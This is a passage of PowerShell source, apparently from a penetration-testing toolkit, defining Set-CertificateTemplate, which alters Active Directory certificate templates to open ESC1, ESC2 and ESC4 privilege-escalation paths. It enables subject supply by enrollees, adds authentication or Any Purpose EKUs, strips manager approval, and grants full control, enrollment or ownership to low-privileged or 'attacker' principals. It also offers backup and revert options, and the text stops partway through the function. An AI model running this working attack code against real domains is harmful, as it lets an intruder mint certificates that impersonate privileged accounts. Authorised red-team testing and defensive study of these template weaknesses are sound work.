function Set-CertificateTemplate {
<#
.SYNOPSIS
    Modifies Certificate Template properties for Active Directory Certificate Services (ADCS).

.DESCRIPTION
    Allows modification of certificate template properties and permissions.
    Designed for penetration testing scenarios including ESC1, ESC4, and template exploitation.

    Common Use Cases:
    - ESC1: Configure template for privilege escalation (EnrolleeSuppliesSubject + Client Auth)
    - ESC4: Grant enrollment permissions to low-privileged accounts
    - Template Publishing: Enable/disable templates on Certificate Authorities
    - Cleanup: Revert changes after testing

.PARAMETER Identity
    Template name or distinguished name to modify.
    Examples: "WebServer", "CN=WebServer,CN=Certificate Templates,..."

.PARAMETER AllowEnrolleeSuppliesSubject
    Enable ENROLLEE_SUPPLIES_SUBJECT flag (ESC1 indicator).
    Allows enrollee to specify arbitrary Subject/SAN in certificate request.

.PARAMETER AddClientAuthentication
    Add Client Authentication EKU (1.3.6.1.5.5.7.3.2) to template.
    Required for Kerberos authentication and privilege escalation.

.PARAMETER AllowExportableKey
    Enable EXPORTABLE_KEY flag in msPKI-Private-Key-Flag.
    Allows private key export after enrollment.

.PARAMETER RemoveManagerApproval
    Remove PEND_ALL_REQUESTS flag from msPKI-Enrollment-Flag.
    Bypasses CA manager approval requirement.

.PARAMETER GrantEnrollment
    Grant Certificate-Enrollment extended right to specified principal.
    Example: -GrantEnrollment "CONTOSO\LowPrivUser"

.PARAMETER GrantFullControl
    Grant GenericAll (full control) to specified principal.
    Example: -GrantFullControl "CONTOSO\AttackerGroup"

.PARAMETER GrantWrite
    Grant WriteProperty permission to specified principal.
    Allows further template modifications.

.PARAMETER RevokeEnrollment
    Remove Certificate-Enrollment extended right from specified principal.
    Used for cleanup after testing.

.PARAMETER DisableEnrolleeSuppliesSubject
    Remove ENROLLEE_SUPPLIES_SUBJECT flag from msPKI-Certificate-Name-Flag.
    Restores default subject name handling (CA supplies subject from AD).
    Used for cleanup after ESC1 testing.

.PARAMETER AddManagerApproval
    Add PEND_ALL_REQUESTS flag to msPKI-Enrollment-Flag.
    Requires CA manager approval for all certificate requests.
    Used for cleanup after ESC1 testing.

.PARAMETER RemoveEKU
    Remove specific Extended Key Usage OID from template.
    Example: -RemoveEKU "1.3.6.1.5.5.7.3.2" (removes Client Authentication)

.PARAMETER AddAnyPurposeEKU
    Add Any Purpose EKU (2.5.29.37.0) to template.
    This EKU allows the certificate to be used for any purpose (ESC2).

.PARAMETER ClearEKUs
    Remove ALL Extended Key Usages from template.
    A template with no EKUs allows any purpose (ESC2 variant).

.PARAMETER AddSmartcardLogon
    Add Smartcard Logon EKU (1.3.6.1.4.1.311.20.2.2) to template.
    Required for PKINIT authentication against Active Directory.

.PARAMETER SetOwner
    Change the owner of the certificate template object.
    Example: -SetOwner "CONTOSO\AdminUser"

.PARAMETER GrantAutoEnroll
    Grant Certificate-AutoEnrollment extended right to specified principal.
    Allows automatic certificate enrollment via Group Policy.
    Example: -GrantAutoEnroll "CONTOSO\Domain Computers"

.PARAMETER Export
    Export template configuration to JSON file for backup/restore.
    Example: -Export "C:\Backup\WebServer_backup.json"

.PARAMETER Domain
    Target domain (FQDN). Optional - uses current domain if not specified.

.PARAMETER Server
    Target domain controller. Optional - uses automatic DC discovery.

.PARAMETER Credential
    PSCredential object for authentication.

.EXAMPLE
    # ESC1: Configure template for privilege escalation
    Set-CertificateTemplate -Identity "WebServer" `
        -AllowEnrolleeSuppliesSubject `
        -AddClientAuthentication `
        -AllowExportableKey

.EXAMPLE
    # ESC4: Grant enrollment to low-privileged account
    Set-CertificateTemplate -Identity "DomainController" `
        -GrantEnrollment "CONTOSO\LowPrivUser"

.EXAMPLE
    # Cleanup: Revoke enrollment permissions
    Set-CertificateTemplate -Identity "WebServer" `
        -RevokeEnrollment "CONTOSO\TestUser"

.EXAMPLE
    # Cleanup: Revert ESC1 changes
    Set-CertificateTemplate -Identity "WebServer" `
        -DisableEnrolleeSuppliesSubject `
        -AddManagerApproval

.EXAMPLE
    # ESC2: Add Any Purpose EKU
    Set-CertificateTemplate -Identity "User" `
        -AddAnyPurposeEKU

.EXAMPLE
    # Add Smartcard Logon for PKINIT
    Set-CertificateTemplate -Identity "SmartcardUser" `
        -AddSmartcardLogon

.EXAMPLE
    # Remove specific EKU
    Set-CertificateTemplate -Identity "WebServer" `
        -RemoveEKU "1.3.6.1.5.5.7.3.1"

.EXAMPLE
    # Grant Auto-Enrollment permission
    Set-CertificateTemplate -Identity "Workstation" `
        -GrantAutoEnroll "CONTOSO\Domain Computers"

.EXAMPLE
    # Take ownership of template
    Set-CertificateTemplate -Identity "WebServer" `
        -SetOwner "CONTOSO\AttackerUser"

.EXAMPLE
    # Backup template before modification
    Set-CertificateTemplate -Identity "WebServer" `
        -Export "C:\Backup\WebServer_backup.json"

.OUTPUTS
    PSCustomObject with modification results

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Low')]
    [OutputType([System.Management.Automation.PSCustomObject])]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [Alias('Name')]
        [string]$Identity,

        # ESC1 Configuration - Flag Modifications
        [Parameter(Mandatory=$false)]
        [switch]$AllowEnrolleeSuppliesSubject,

        [Parameter(Mandatory=$false)]
        [switch]$AddClientAuthentication,

        [Parameter(Mandatory=$false)]
        [switch]$AllowExportableKey,

        [Parameter(Mandatory=$false)]
        [switch]$RemoveManagerApproval,

        # ESC4 - ACL Modifications
        [Parameter(Mandatory=$false)]
        [string]$GrantEnrollment,

        [Parameter(Mandatory=$false)]
        [string]$GrantFullControl,

        [Parameter(Mandatory=$false)]
        [string]$GrantWrite,

        [Parameter(Mandatory=$false)]
        [string]$RevokeEnrollment,

        # Cleanup/Revert Parameters (ESC1 Cleanup)
        [Parameter(Mandatory=$false)]
        [switch]$DisableEnrolleeSuppliesSubject,

        [Parameter(Mandatory=$false)]
        [switch]$AddManagerApproval,

        # EKU Manipulation Parameters
        [Parameter(Mandatory=$false)]
        [string]$RemoveEKU,

        [Parameter(Mandatory=$false)]
        [switch]$AddAnyPurposeEKU,

        [Parameter(Mandatory=$false)]
        [switch]$ClearEKUs,

        [Parameter(Mandatory=$false)]
        [switch]$AddSmartcardLogon,

        # Advanced ACL Parameters
        [Parameter(Mandatory=$false)]
        [string]$SetOwner,

        [Parameter(Mandatory=$false)]
        [string]$GrantAutoEnroll,

        # Export/Backup
        [Parameter(Mandatory=$false)]
        [string]$Export,

        # Import/Restore from Backup
        [Parameter(Mandatory=$false)]
        [string]$Import,

        # Connection Parameters
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential
    )

    begin {
        Write-Log "[Set-CertificateTemplate] Starting certificate template modification"

        # Track modifications for result reporting
        $Modifications = @()
    }

    process {
        # Ensure LDAP connection at start of process block
        $ConnectionParams = @{}
        if ($PSBoundParameters.ContainsKey('Domain')) { $ConnectionParams['Domain'] = $Domain }
        if ($PSBoundParameters.ContainsKey('Server')) { $ConnectionParams['Server'] = $Server }
        if ($PSBoundParameters.ContainsKey('Credential')) { $ConnectionParams['Credential'] = $Credential }

        if (-not (Ensure-LDAPConnection @ConnectionParams)) {
            return [PSCustomObject]@{
                Operation = "ModifyCertificateTemplate"
                Template = $Identity
                Success = $false
                Message = "No LDAP connection available"
            }
        }

        try {
            # IMPORT MODE: Restore template(s) from JSON backup
            if ($Import) {
                Write-Log "[Set-CertificateTemplate] Importing template(s) from: $Import"

                # Validate import file exists and is a file (not directory)
                if (-not (Test-Path -Path $Import -PathType Leaf)) {
                    throw "Import file not found or is a directory: $Import"
                }

                # Load JSON backup
                try {
                    $ImportData = Get-Content -Path $Import -Raw | ConvertFrom-Json
                }
                catch {
                    throw "Failed to parse import file (invalid JSON): $_"
                }

                # Validate JSON structure
                if (-not $ImportData.Templates) {
                    throw "Invalid import file format: Missing 'Templates' array"
                }

                Write-Log "[Set-CertificateTemplate] Import file contains $($ImportData.TemplateCount) template(s)"

                # Get Configuration NC for SearchBase
                $ConfigNC = $Script:LDAPContext.ConfigurationNamingContext
                $TemplatesBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigNC"

                $RestoredCount = 0
                $FailedCount = 0

                foreach ($BackupTemplate in $ImportData.Templates) {
                    try {
                        $TemplateName = $BackupTemplate.cn
                        Write-Log "[Set-CertificateTemplate] Restoring template: $TemplateName"

                        # Load ALL attributes from backup (not just default 30 properties!)
                        # Get list of all exported attributes to compare
                        $BackupAttributeNames = @($BackupTemplate.PSObject.Properties | ForEach-Object { $_.Name })

                        # Add required properties for identification (if not already in backup)
                        $RequiredProperties = @('cn', 'displayName', 'distinguishedName')
                        $AllProperties = @($BackupAttributeNames) + $RequiredProperties | Select-Object -Unique

                        Write-Log "[Set-CertificateTemplate] Backup contains $($BackupAttributeNames.Count) attributes, loading $($AllProperties.Count) total properties"

                        # Query template with all backup attributes + required properties
                        $ExistingTemplate = @(Get-CertificateTemplate -Identity $TemplateName -ShowAll -Raw -Properties $AllProperties)[0]
                        if (-not $ExistingTemplate) {
                            Write-Warning "[!] Template '$TemplateName' does not exist in AD - skipping"
                            $FailedCount++
                            continue
                        }

                        $TemplateDN = $ExistingTemplate.distinguishedName

                        # Build hashtable of attributes to restore
                        $RestoreAttributes = @{}
                        $ExcludedAttributes = @(
                            'cn',                        # Identity, not restorable
                            'name',                      # Usually same as cn, system-managed
                            'distinguishedname',         # Identity, not restorable
                            'objectguid',                # System-generated
                            'objectcategory',            # System-generated
                            'objectclass',               # System-generated
                            'instancetype',              # System-generated
                            'whencreated',               # System-generated timestamp
                            'whenchanged',               # System-generated timestamp
                            'dscorepropagationdata',     # System-generated replication metadata
                            'usncreated',                # System-generated USN
                            'usnchanged',                # System-generated USN
                            'ntsecuritydescriptor',      # ACLs handled separately
                            'pkiexpirationperiod',       # Binary attribute, cannot restore via JSON
                            'pkioverlapperiod',          # Binary attribute, cannot restore via JSON
                            'pkidefaultkeyspec',         # Converted value, restore raw instead
                            'pkikeyusage',               # Converted value, restore raw instead
                            'revision',                  # Auto-incremented, don't restore old value
                            'showinadvancedviewonly'     # UI-specific, not critical
                        )

                        $BackupTemplate.PSObject.Properties | Where-Object {
                            $ExcludedAttributes -notcontains $_.Name.ToLower() -and $null -ne $_.Value
                        } | ForEach-Object {
                            $AttributeName = $_.Name
                            $BackupValue = $_.Value

                            # Get current value from existing template
                            $CurrentValue = $ExistingTemplate.$AttributeName

                            # Compare values - only restore if different
                            $ValuesMatch = $false

                            if ($null -eq $CurrentValue -and $null -eq $BackupValue) {
                                $ValuesMatch = $true
                            }
                            elseif ($null -eq $CurrentValue -or $null -eq $BackupValue) {
                                $ValuesMatch = $false
                            }
                            elseif ($BackupValue -is [System.Array] -and $CurrentValue -is [System.Array]) {
                                # Array comparison - check if same elements
                                if ($BackupValue.Count -eq $CurrentValue.Count) {
                                    $ValuesMatch = $true
                                    for ($i = 0; $i -lt $BackupValue.Count; $i++) {
                                        if ($BackupValue[$i] -ne $CurrentValue[$i]) {
                                            $ValuesMatch = $false
                                            break
                                        }
                                    }
                                }
                            }
                            else {
                                # Scalar comparison
                                $ValuesMatch = ($BackupValue -eq $CurrentValue)
                            }

                            # Only add to restore list if values differ
                            if (-not $ValuesMatch) {
                                Write-Log "[Set-CertificateTemplate]   Attribute '$AttributeName' differs - will restore (Current: $CurrentValue, Backup: $BackupValue)"

                                # Convert JSON arrays to proper PowerShell arrays
                                $AttributeValue = $BackupValue
                                if ($AttributeValue -is [System.Array]) {
                                    $AttributeValue = [string[]]@($AttributeValue)
                                }
                                $RestoreAttributes[$AttributeName] = $AttributeValue
                            }
                            else {
                                Write-Log "[Set-CertificateTemplate]   Attribute '$AttributeName' unchanged - skipping"
                            }
                        }

                        if ($RestoreAttributes.Count -eq 0) {
                            Show-Line "Template '$TemplateName' already matches backup - no changes needed" -Class Note
                            continue
                        }

                        Write-Log "[Set-CertificateTemplate] Restoring $($RestoreAttributes.Count) changed attribute(s): $($RestoreAttributes.Keys -join ', ')"

                        # Restore attributes using Set-DomainObject
                        if ($PSCmdlet.ShouldProcess($TemplateName, "Restore template from backup")) {
                            try {
                                $null = Set-DomainObject -Identity $TemplateDN -Set $RestoreAttributes -SearchBase $TemplatesBase -ErrorAction Stop
                                # Success - increment counter and show message
                                $RestoredCount++
                                Show-Line "Successfully restored template: $TemplateName ($($RestoreAttributes.Count) attributes)" -Class Hint
                            }
                            catch {
                                Write-Warning "[!] Failed to restore template '$TemplateName': $($_.Exception.Message)"
                                $FailedCount++
                            }
                        }
                    }
                    catch {
                        Write-Warning "[!] Error processing template '$TemplateName': $($_.Exception.Message)"
                        $FailedCount++
                    }
                }

                # Return nothing - all output already shown via Show-Line/Show-Object
                return
            }

            # EXPORT MODE: Export template to JSON backup
            if ($Export) {
                Write-Log "[Set-CertificateTemplate] Exporting template '$Identity' to: $Export"

                # Get Configuration NC for SearchBase
                $ConfigNC = $Script:LDAPContext.ConfigurationNamingContext
                $TemplatesBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigNC"

                # Find template with all properties for complete backup
                $TemplateInfo = @(Get-CertificateTemplate -Identity $Identity -ShowAll -Raw)[0]
                if (-not $TemplateInfo) {
                    throw "Certificate template '$Identity' not found"
                }

                $TemplateName = $TemplateInfo.cn

                # Build export object with all relevant properties
                $ExportData = [ordered]@{
                    ExportDate = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
                    ExportedBy = "$env:USERDOMAIN\$env:USERNAME"
                    TemplateCount = 1
                    Templates = @(
                        $TemplateInfo
                    )
                }

                try {
                    $ExportData | ConvertTo-Json -Depth 10 | Set-Content -Path $Export -Encoding UTF8 -ErrorAction Stop
                    Show-Line "Successfully exported template '$TemplateName' to: $Export" -Class Hint
                }
                catch {
                    throw "Failed to write export file: $_"
                }

                return
            }

            # MODIFICATION MODE: Normal template modifications, check if at least one modification parameter was provided
            $ModificationParams = @(
                'AllowEnrolleeSuppliesSubject',
                'AddClientAuthentication',
                'AllowExportableKey',
                'RemoveManagerApproval',
                'GrantEnrollment',
                'GrantFullControl',
                'GrantWrite',
                'RevokeEnrollment',
                # Cleanup/Revert Parameters
                'DisableEnrolleeSuppliesSubject',
                'AddManagerApproval',
                # EKU Manipulation
                'RemoveEKU',
                'AddAnyPurposeEKU',
                'ClearEKUs',
                'AddSmartcardLogon',
                # Advanced ACL
                'SetOwner',
                'GrantAutoEnroll'
            )

            $HasModification = $false
            foreach ($param in $ModificationParams) {
                if ($PSBoundParameters.ContainsKey($param)) {
                    $HasModification = $true
                    break
                }
            }

            if (-not $HasModification) {
                # No modification parameters provided - show helpful usage examples
                Show-NoParametersError -FunctionName "Set-CertificateTemplate"
                return $null
            }

            Write-Log "[Set-CertificateTemplate] Searching for template: $Identity"

            # Get Configuration NC for SearchBase
            $ConfigNC = $Script:LDAPContext.ConfigurationNamingContext
            $TemplatesBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigNC"

            # Find template by name or DN using Get-CertificateTemplate (which uses Get-DomainObject)
            # -ShowAll: Include unpublished templates, -Raw: Get raw integer values for flag manipulation
            $TemplateInfo = @(Get-CertificateTemplate -Identity $Identity -ShowAll -Raw)[0]
            if (-not $TemplateInfo) {
                throw "Certificate template '$Identity' not found"
            }

            $TemplateDN = $TemplateInfo.distinguishedName
            $TemplateName = $TemplateInfo.cn
            Write-Log "[Set-CertificateTemplate] Found template: $TemplateName ($TemplateDN)"

            # --- Write permission pre-check ---
            # Test write access before making modifications to fail early with a clear message.
            # We test by writing the current revision value back (no-op change).
            $HasAnyModification = ($AllowEnrolleeSuppliesSubject -or $AllowExportableKey -or $RemoveManagerApproval -or
                $DisableEnrolleeSuppliesSubject -or $AddManagerApproval -or $AddClientAuthentication -or
                $RemoveClientAuthentication -or $RemoveEKU -or $AddAnyPurposeEKU -or $ClearEKUs -or
                $AddSmartcardLogon -or $GrantEnrollment -or $GrantFullControl -or $GrantWrite -or
                $RevokeEnrollment -or $SetOwner -or $GrantAutoEnroll)

            if ($HasAnyModification) {
                Write-Log "[Set-CertificateTemplate] Testing write permissions on template"
                $CurrentRevision = if ($TemplateInfo.revision) { [int]$TemplateInfo.revision } else { 0 }
                $writeTest = Set-DomainObject -Identity $TemplateDN -Set @{'revision' = $CurrentRevision} -SearchBase $TemplatesBase -ErrorAction SilentlyContinue
                if ($writeTest -eq $false) {
                    throw "Insufficient permissions to modify template '$TemplateName'. Ensure the current user has Write access to the certificate template object."
                }
                Write-Log "[Set-CertificateTemplate] Write permission check passed"
            }

            # ESC1 Flag Modifications
            if ($AllowEnrolleeSuppliesSubject) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Enable ENROLLEE_SUPPLIES_SUBJECT flag") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Setting ENROLLEE_SUPPLIES_SUBJECT flag"

                    # Get current flag value (raw integer from Get-CertificateTemplate -Raw)
                    $CurrentFlags = if ($TemplateInfo.'msPKI-Certificate-Name-Flag') {
                        [int]$TemplateInfo.'msPKI-Certificate-Name-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Certificate-Name-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    # ENROLLEE_SUPPLIES_SUBJECT is an EXCLUSIVE flag!
                    # When set, all other msPKI-Certificate-Name-Flag values are irrelevant and should be cleared.
                    # This matches the behavior of the ADCS GUI - setting this flag replaces all other subject name flags.
                    $NewFlags = 0x00000001  # ENROLLEE_SUPPLIES_SUBJECT only (clear all other flags)
                    Write-Log "[Set-CertificateTemplate] New msPKI-Certificate-Name-Flag: $NewFlags (0x$($NewFlags.ToString('X'))) - All other flags cleared (ENROLLEE_SUPPLIES_SUBJECT is exclusive)"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Certificate-Name-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Enabled ENROLLEE_SUPPLIES_SUBJECT (cleared all other subject name flags)"
                }
            }

            if ($AllowExportableKey) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Enable EXPORTABLE_KEY flag") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Setting EXPORTABLE_KEY flag"

                    # Get current flag value (raw integer from Get-CertificateTemplate -Raw)
                    $CurrentFlags = if ($TemplateInfo.'msPKI-Private-Key-Flag') {
                        [int]$TemplateInfo.'msPKI-Private-Key-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Private-Key-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    $NewFlags = $CurrentFlags -bor 0x00000010  # EXPORTABLE_KEY
                    Write-Log "[Set-CertificateTemplate] New msPKI-Private-Key-Flag: $NewFlags (0x$($NewFlags.ToString('X')))"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Private-Key-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Enabled EXPORTABLE_KEY"
                }
            }

            if ($RemoveManagerApproval) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Remove manager approval requirement") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Removing PEND_ALL_REQUESTS flag"

                    # Get current flag value (raw integer from Get-CertificateTemplate -Raw)
                    $CurrentFlags = if ($TemplateInfo.'msPKI-Enrollment-Flag') {
                        [int]$TemplateInfo.'msPKI-Enrollment-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Enrollment-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    $NewFlags = $CurrentFlags -band (-bnot 0x00000002)  # Remove PEND_ALL_REQUESTS
                    Write-Log "[Set-CertificateTemplate] New msPKI-Enrollment-Flag: $NewFlags (0x$($NewFlags.ToString('X')))"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Enrollment-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Removed manager approval requirement"
                }
            }

            # ===== Cleanup/Revert Parameters (reverse of ESC1 attack) =====
            if ($DisableEnrolleeSuppliesSubject) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Disable ENROLLEE_SUPPLIES_SUBJECT flag") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Removing ENROLLEE_SUPPLIES_SUBJECT flag"

                    $CurrentFlags = if ($TemplateInfo.'msPKI-Certificate-Name-Flag') {
                        [int]$TemplateInfo.'msPKI-Certificate-Name-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Certificate-Name-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    # Remove ENROLLEE_SUPPLIES_SUBJECT (0x1) and restore typical defaults:
                    # SUBJECT_ALT_REQUIRE_UPN (0x02000000) + SUBJECT_ALT_REQUIRE_EMAIL (0x04000000) + SUBJECT_REQUIRE_DIRECTORY_PATH (0x80000000)
                    # This is the typical setting for User templates
                    $NewFlags = $CurrentFlags -band (-bnot 0x00000001)  # Remove ENROLLEE_SUPPLIES_SUBJECT
                    if ($NewFlags -eq 0) {
                        # If clearing ENROLLEE_SUPPLIES_SUBJECT leaves flags at 0, set reasonable defaults
                        # SUBJECT_ALT_REQUIRE_UPN = 0x02000000 (CA supplies UPN from AD)
                        $NewFlags = 0x02000000
                        Write-Log "[Set-CertificateTemplate] Setting default: SUBJECT_ALT_REQUIRE_UPN"
                    }
                    Write-Log "[Set-CertificateTemplate] New msPKI-Certificate-Name-Flag: $NewFlags (0x$($NewFlags.ToString('X')))"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Certificate-Name-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Disabled ENROLLEE_SUPPLIES_SUBJECT (restored CA-supplied subject)"
                }
            }

            if ($AddManagerApproval) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Add manager approval requirement") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Adding PEND_ALL_REQUESTS flag"

                    $CurrentFlags = if ($TemplateInfo.'msPKI-Enrollment-Flag') {
                        [int]$TemplateInfo.'msPKI-Enrollment-Flag'
                    } else { 0 }

                    Write-Log "[Set-CertificateTemplate] Current msPKI-Enrollment-Flag: $CurrentFlags (0x$($CurrentFlags.ToString('X')))"

                    $NewFlags = $CurrentFlags -bor 0x00000002  # Add PEND_ALL_REQUESTS
                    Write-Log "[Set-CertificateTemplate] New msPKI-Enrollment-Flag: $NewFlags (0x$($NewFlags.ToString('X')))"

                    $null = Set-DomainObject -Identity $TemplateDN -Set @{'msPKI-Enrollment-Flag' = $NewFlags} -SearchBase $TemplatesBase
                    $Modifications += "Added manager approval requirement"
                }
            }

            # EKU Modifications
            if ($AddClientAuthentication) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Add Client Authentication EKU") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Adding Client Authentication EKU"

                    # Client Authentication OID: 1.3.6.1.5.5.7.3.2
                    $ClientAuthOID = "1.3.6.1.5.5.7.3.2"

                    # Get current EKU values (multi-value attribute from Get-CertificateTemplate -Raw)
                    # Handle both single-value (string) and multi-value (array) cases
                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            # Multi-value: flatten to string array
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            # Single-value: wrap in array
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    Write-Log "[Set-CertificateTemplate] Current pKIExtendedKeyUsage (${CurrentEKU.Count} items): $($CurrentEKU -join ', ')"

                    if ($CurrentEKU -notcontains $ClientAuthOID) {
                        # Build new array with proper flattening
                        $NewEKU = [string[]]@($CurrentEKU + $ClientAuthOID)
                        Write-Log "[Set-CertificateTemplate] New pKIExtendedKeyUsage (${NewEKU.Count} items): $($NewEKU -join ', ')"

                        $null = Set-DomainObject -Identity $TemplateDN -Set @{'pKIExtendedKeyUsage' = $NewEKU} -SearchBase $TemplatesBase
                        $Modifications += "Added Client Authentication EKU"
                    } else {
                        Write-Log "[Set-CertificateTemplate] Client Authentication EKU already present"
                        $Modifications += "Client Authentication EKU already present (no change)"
                    }
                }
            }

            # ===== Additional EKU Manipulation Parameters =====

            # RemoveEKU - Remove specific EKU OID
            if ($RemoveEKU) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Remove EKU: $RemoveEKU") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Removing EKU: $RemoveEKU"

                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    Write-Log "[Set-CertificateTemplate] Current pKIExtendedKeyUsage (${CurrentEKU.Count} items): $($CurrentEKU -join ', ')"

                    if ($CurrentEKU -contains $RemoveEKU) {
                        $NewEKU = [string[]]@($CurrentEKU | Where-Object { $_ -ne $RemoveEKU })
                        Write-Log "[Set-CertificateTemplate] New pKIExtendedKeyUsage (${NewEKU.Count} items): $($NewEKU -join ', ')"

                        if ($NewEKU.Count -gt 0) {
                            $null = Set-DomainObject -Identity $TemplateDN -Set @{'pKIExtendedKeyUsage' = $NewEKU} -SearchBase $TemplatesBase
                        }
                        else {
                            # Clear the attribute if no EKUs remain
                            $null = Set-DomainObject -Identity $TemplateDN -Clear @('pKIExtendedKeyUsage') -SearchBase $TemplatesBase
                        }
                        $Modifications += "Removed EKU: $RemoveEKU"
                    }
                    else {
                        Write-Log "[Set-CertificateTemplate] EKU $RemoveEKU not present in template"
                        $Modifications += "EKU $RemoveEKU not present (no change)"
                    }
                }
            }

            # AddAnyPurposeEKU - Add Any Purpose EKU (ESC2)
            if ($AddAnyPurposeEKU) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Add Any Purpose EKU (ESC2)") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Adding Any Purpose EKU"

                    $AnyPurposeOID = "2.5.29.37.0"

                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    Write-Log "[Set-CertificateTemplate] Current pKIExtendedKeyUsage (${CurrentEKU.Count} items): $($CurrentEKU -join ', ')"

                    if ($CurrentEKU -notcontains $AnyPurposeOID) {
                        $NewEKU = [string[]]@($CurrentEKU + $AnyPurposeOID)
                        Write-Log "[Set-CertificateTemplate] New pKIExtendedKeyUsage (${NewEKU.Count} items): $($NewEKU -join ', ')"

                        $null = Set-DomainObject -Identity $TemplateDN -Set @{'pKIExtendedKeyUsage' = $NewEKU} -SearchBase $TemplatesBase
                        $Modifications += "Added Any Purpose EKU (2.5.29.37.0) - ESC2"
                    }
                    else {
                        Write-Log "[Set-CertificateTemplate] Any Purpose EKU already present"
                        $Modifications += "Any Purpose EKU already present (no change)"
                    }
                }
            }

            # ClearEKUs - Remove ALL EKUs (ESC2 variant - no EKUs = any purpose)
            if ($ClearEKUs) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Clear all EKUs (ESC2 variant)") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Clearing all EKUs"

                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    if ($CurrentEKU.Count -gt 0) {
                        Write-Log "[Set-CertificateTemplate] Removing $($CurrentEKU.Count) EKU(s): $($CurrentEKU -join ', ')"

                        $null = Set-DomainObject -Identity $TemplateDN -Clear @('pKIExtendedKeyUsage') -SearchBase $TemplatesBase
                        $Modifications += "Cleared all EKUs ($($CurrentEKU.Count) removed) - ESC2 variant"
                    }
                    else {
                        Write-Log "[Set-CertificateTemplate] No EKUs to clear"
                        $Modifications += "No EKUs present (no change)"
                    }
                }
            }

            # AddSmartcardLogon - Add Smartcard Logon EKU for PKINIT
            if ($AddSmartcardLogon) {
                if ($PSCmdlet.ShouldProcess($TemplateName, "Add Smartcard Logon EKU") -eq $true) {
                    Write-Log "[Set-CertificateTemplate] Adding Smartcard Logon EKU"

                    $SmartcardLogonOID = "1.3.6.1.4.1.311.20.2.2"

                    $CurrentEKU = @()
                    if ($TemplateInfo.pKIExtendedKeyUsage) {
                        $ekuValue = $TemplateInfo.pKIExtendedKeyUsage
                        if ($ekuValue -is [System.Array]) {
                            $CurrentEKU = @($ekuValue | ForEach-Object { [string]$_ })
                        }
                        else {
                            $CurrentEKU = @([string]$ekuValue)
                        }
                    }

                    Write-Log "[Set-CertificateTemplate] Current pKIExtendedKeyUsage (${CurrentEKU.Count} items): $($CurrentEKU -join ', ')"

                    if ($CurrentEKU -notcontains $SmartcardLogonOID) {
                        $NewEKU = [string[]]@($CurrentEKU + $SmartcardLogonOID)
                        Write-Log "[Set-CertificateTemplate] New pKIExtendedKeyUsage (${NewEKU.Count} items): $($NewEKU -join ', ')"

                        $null = Set-DomainObject -Identity $TemplateDN -Set @{'pKIExtendedKeyUsage' = $NewEKU} -SearchBase $TemplatesBase
